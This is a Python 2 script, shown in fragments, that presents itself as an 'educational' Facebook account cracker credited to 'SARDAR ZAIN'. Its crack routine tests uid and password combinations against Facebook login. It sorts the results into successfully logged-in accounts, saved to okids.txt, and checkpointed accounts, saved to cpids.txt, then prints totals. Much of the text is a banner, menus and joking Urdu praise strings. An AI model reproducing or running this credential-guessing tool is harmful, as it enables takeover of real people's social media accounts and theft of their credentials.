#Script Given By SARDAR ZAIN
#Script Is Given For Educational Purpose
#Script Edited By SARDADZAIN
#Utf-8 python 
...
Sardar = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
Sardarchoice = random.choice(Sardar)
agents = [
...
\n\033[0m-----------------------------------------
\033[1;92mAuthor \033[1;93m: SARDAR ZAIN
\033[1;92mFb \033[1;93m: SARDAR ZAIN
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://youtube.com/shorts/mlvvfxMVl80?feature=share')
        main()
    else:
        print ''
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks SARDARZAIN
    print ''
    crack_select()
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[SARDAR-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[SARDAR-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks SARDARZAIN
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks Sardar Zain
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
...
#Thanks SARDAR ZAIN & Badshah Sarkar
